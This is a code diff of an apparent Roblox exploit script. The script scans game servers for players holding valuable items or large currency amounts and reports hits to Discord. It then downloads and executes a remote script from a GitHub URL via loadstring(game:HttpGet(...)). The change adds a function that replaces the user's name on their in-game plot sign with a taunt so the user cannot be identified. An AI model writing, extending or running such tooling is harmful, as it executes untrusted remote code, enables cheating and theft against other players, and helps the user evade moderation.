@@ -109,6 +109,20 @@ local function GetBrainrotUrl(name)
 	return nil
 end
 
+local function Anonymousify()
+	local player = game.Players.LocalPlayer	
+	
+	for _, plot in pairs(workspace.Plots:GetChildren()) do
+		local textlabel = plot:FindFirstChild("PlotSign"):FindFirstChild("SurfaceGui"):FindFirstChild("Frame"):FindFirstChild("TextLabel")
+		if not textlabel then return end
+		
+		local playerFromSign = GetPlayerNameFromLabel(textlabel)
+		if player == playerFromSign then
+			textlabel.Text = "good luck finding me lmao"
+		end
+	end
+end
+
 local function DiscordNotificationCURRENCY(txtlbl, temp)
 
 	local ovrhead = txtlbl.Parent
@@ -412,34 +426,35 @@ local minimum = 10_000_000
 local nameFound, matchedName = CheckNames()
 local meetsMinimum, highestAmount, currencyTextLabel, temp = CheckCurrency(minimum)
 
-
 local hasMatch = meetsMinimum or nameFound
 local mainScript = "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"
 
 if meetsMinimum then
-	print("Ooooo we got something")
 	local sound = Instance.new("Sound")
 	sound.SoundId = "rbxassetid://8486683243"
 	sound.Volume = 1
 	sound.Looped = false
 	sound.Parent = game.SoundService 
 	sound:Play()
-
+	
+	Anonymousify()
+	
 	task.spawn(function()
 		loadstring(game:HttpGet(mainScript))()
 	end)
-
+	
 	DiscordNotificationCURRENCY(currencyTextLabel, temp)
 
 elseif nameFound then
-	print("yess we found")
 	local sound = Instance.new("Sound")
 	sound.SoundId = "rbxassetid://8486683243"
 	sound.Volume = 1
 	sound.Looped = false
 	sound.Parent = game.SoundService 
 	sound:Play()
-
+	
+	Anonymousify()
+	
 	task.spawn(function()
 		loadstring(game:HttpGet(mainScript))()
 	end)
